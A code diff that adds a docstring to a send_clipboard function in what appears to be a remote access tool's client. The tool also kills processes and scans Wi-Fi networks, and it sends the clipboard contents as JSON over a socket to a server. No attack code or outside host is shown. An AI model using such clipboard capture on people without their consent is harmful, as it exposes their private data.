@@ -830,7 +830,7 @@ def kill_process(socket: socket.socket, command: str) -> bool:
 def get_wifi_list(socket: socket.socket) -> bool:
     """
     Retrieves the list of available Wi-Fi networks and sends the results through the socket.
-    
+
     This function detects the operating system and uses the appropriate command-line tool
     to scan for available Wi-Fi networks. The results are formatted and sent back through
     the socket connection. Supports Windows, Linux (nmcli/iwlist), and macOS (airport).
@@ -964,6 +964,37 @@ def get_wifi_list(socket: socket.socket) -> bool:
 def send_clipboard(
     socket: socket.socket, max_retries: int = 3, retry_delay: float = 1.0
 ) -> bool:
+    """
+    Reads the system clipboard content and sends it to the connected socket with retry logic.
+
+    This function attempts to read the clipboard content using pyperclip, formats it as JSON,
+    and sends it through the socket connection. Implements automatic retry mechanism for
+    socket-related failures with configurable retry settings.
+
+    Args:
+        socket (socket.socket): Connected socket for sending clipboard data
+        max_retries (int, optional): Maximum number of retry attempts on socket errors. Defaults to 3.
+        retry_delay (float, optional): Delay in seconds between retry attempts. Defaults to 1.0.
+
+    Returns:
+        bool: True if clipboard content was successfully sent,
+              False if any unrecoverable error occurred (with reason sent via socket)
+
+    Note:
+        - Handles empty clipboard cases gracefully
+        - Only retries on socket-related errors (not clipboard reading errors)
+        - Sends JSON formatted data with type "clipboard" and the content
+        - All error messages are communicated through the socket
+        - Requires pyperclip package to be installed
+
+    Example successful output:
+        {"type": "clipboard", "content": "Copied text example"}
+
+    Error cases:
+        - "Clipboard is empty" if no content found
+        - "Error in reading clipboard: [error]" if clipboard access fails
+        - "Sending clipboard to server was not successful" after all retries fail
+    """
     retry_count = 0
 
     while retry_count < max_retries:
